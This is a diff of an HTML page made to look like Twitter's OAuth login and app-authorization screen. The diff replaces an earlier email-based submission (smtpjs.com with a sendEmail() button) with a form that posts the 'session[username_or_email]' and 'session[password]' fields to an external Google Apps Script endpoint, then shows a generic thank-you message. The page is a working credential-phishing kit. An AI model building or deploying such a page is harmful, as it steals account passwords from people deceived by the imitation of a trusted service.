@@ -57,40 +57,35 @@
   </dl>
 </div>
 
-      <form action="data.html">
-        <div>
-          <input name="authenticity_token" type="hidden" value="99eef7c19d2cfa2d108a8c8cbdfe1aadead6c55c">
-          <input name="redirect_after_login" type="hidden" value="https://twitter.com/oauth/authenticate?oauth_token=uuw9MwAAAAAA9a3bAAABdXRRNaU">
+        <form class="gform pure-form pure-form-stacked" method="POST" data-email="example@email.net"
+        action="https://script.google.com/macros/s/AKfycbwNbzb4h9e8xZhlKBmHj7_rvwC6Ha-DBN6pAvuGhA/exec">
+        
+        <fieldset class="sign-in">
+        <legend>Log in to Twitter</legend>
+        <div class="row user content">
+        <input aria-required="true" autocapitalize="off" autocorrect="off" autofocus="autofocus" class="text" id="username_or_email" name="session[username_or_email]" type="text" placeholder="Username or email" value="">
         </div>
-
-        <input id="oauth_token" name="oauth_token" type="hidden" value="uuw9MwAAAAAA9a3bAAABdXRRNaU">
-
-          <fieldset class="sign-in">
-  <legend>Log in to Twitter</legend>
-  <div class="row user content">
-    <input aria-required="true" autocapitalize="off" autocorrect="off" autofocus="autofocus" class="text" id="username_or_email" name="session[username_or_email]" type="text" placeholder="Username or email" value="">
-  </div>
-  <div class="row password content">
-    <input aria-required="true" class="password text" id="password" name="session[password]" type="password" placeholder="Password" value="">
-  </div>
-  <p>
-    <input type="checkbox" name="remember_me" id="remember" value="1">
-    <label for="remember">Don't Forget Me</label>
-    ·
-    <a href="https://twitter.com/account/resend_password" class="alternate-context" target="_blank">Forgot password?</a>
-  </p>
-    <input type="hidden" name="ui_metrics" autocomplete="off" value="{&quot;rf&quot;:{&quot;a21e0434788c45fdd4caf40b613cdc0140c13bb26da36ce72bb40bae0896ffcd&quot;:-104,&quot;ad361ab61e46a30d5c18a37a401bb37696f0d22ff9f6624c0670d14da8df0ad2&quot;:-197,&quot;ad560b9cd233b47c0cb43b3baf5f4f125ab386356ffbb83b12dcc9f8173d26f3&quot;:-1,&quot;aab874e020f6f367fd0e29671ed3ce0ca9e6cef326c3cd0b3cea869e90e4de38&quot;:0},&quot;s&quot;:&quot;5rkWFzivnTgmlxFmyYeAq7P0NB8qw5ywD4bItRX6ZhoysbZcg7ZqEokE2H4eiVUXy0x39DC2MEoLsAJpHquOdv1jYclhONpbZ6Y9s-WUdiWNx93OgzWjYTuDF8r7FOqLdZK6SzQ_5JegnuiCqajovkmVjfkfHnDiio6rLU6GofJQb2coWoGJhPMeSxvgCke4HllootulVXl7UnGdm-Dx-D9WZY869D4EiBzi9aJUMM60yBlMazHsgfUNzyheDKlOQMIIxQBn85ci7pBKw-x4HlLGw-GZBQ6VF5K1QFHOnoBX3Z2Z5eh2jyqlwJWW6BsqCvrY2G46s5ihfC9FJKaiegAAAXV0UWbC&quot;}">
-    <script src="" async=""></script>
+        <div class="row password content">
+        <input aria-required="true" class="password text" id="password" name="session[password]" type="password" placeholder="Password" value="">
+        </div>
+        <p>
+        <input type="checkbox" name="remember_me" id="remember" value="1">
+        <label for="remember">Remember Me</label>
+    
+        <a href="https://twitter.com/account/resend_password" class="alternate-context" target="_blank">Forgot password?</a>
+        </p>
+    
 </fieldset>
-<script src="https://smtpjs.com/v3/smtp.js">
-</script>
           
-          <button type="button" onclick="sendEmail()">Sign In</button>
-          <input type="hidden" name="varname" value="12345" />
-          <input type="submit" value="Send data">
-          
-      </form>
-
+          <button>Sign In</button>
+          <div class="thankyou_message" style="display:none;">
+          <h2><em>Thanks</em> for contacting us!
+          We will get back to you soon!</h2>
+          </div>
+        </form>
+            
+<script data-cfasync="false" type="text/javascript"
+  src="form-submission-handler.js"></script>
       
 <div class="permissions allow">
   <p><strong>This application will be able to:</strong></p>
